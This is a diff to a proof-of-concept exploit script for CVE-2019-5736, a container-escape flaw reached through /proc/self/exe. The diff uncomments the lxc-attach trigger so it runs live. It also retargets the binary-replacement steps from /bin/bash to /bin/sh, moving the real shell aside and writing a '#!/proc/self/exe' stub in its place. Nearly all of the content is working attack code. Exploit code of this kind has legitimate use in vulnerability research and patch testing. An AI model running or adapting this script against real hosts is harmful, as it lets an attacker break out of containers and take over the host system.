@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/bin/sh
 # CVE-2019-5736: PoC Exploit Code
 # Copyright (C) 2019 Aleksa Sarai <cyphar@cyphar.com>
 # Vulnerability discovered by Adam Iwaniuk and Borys Popławski.
@@ -41,17 +41,17 @@ gcc -Wall -Werror -fPIC -shared -rdynamic -o "$SECCOMP_TARGET" ./bad_libseccomp_
 # And finally add an entrypoint. You can exploit this any of the following
 # ways:
 #
-#  1. lxc-attach -n c1 -- /proc/self/exe
+lxc-attach -n c1 -- /proc/self/exe
 #  2. lxc-attach -n c1 -- /bin/bad_bash (ln -sf /proc/self/exe /bin/bad_bash)
 #  3. lxc-attach -n c1 -- /bin/bad_bash (echo '#!/proc/self/exe' > /bin/bad_bash)
 #
 # (Or the equivalent for Docker/runc, etc.)
 
 # Keep around good_bash for debugging.
-mv /bin/bash /bin/good_bash
+mv /bin/sh /bin/good_sh
 
 # Make bash evil.
-cat >/bin/bash <<EOF
+cat >/bin/sh <<EOF
 #!/proc/self/exe
 EOF
-chmod +x /bin/bash
+chmod +x /bin/sh
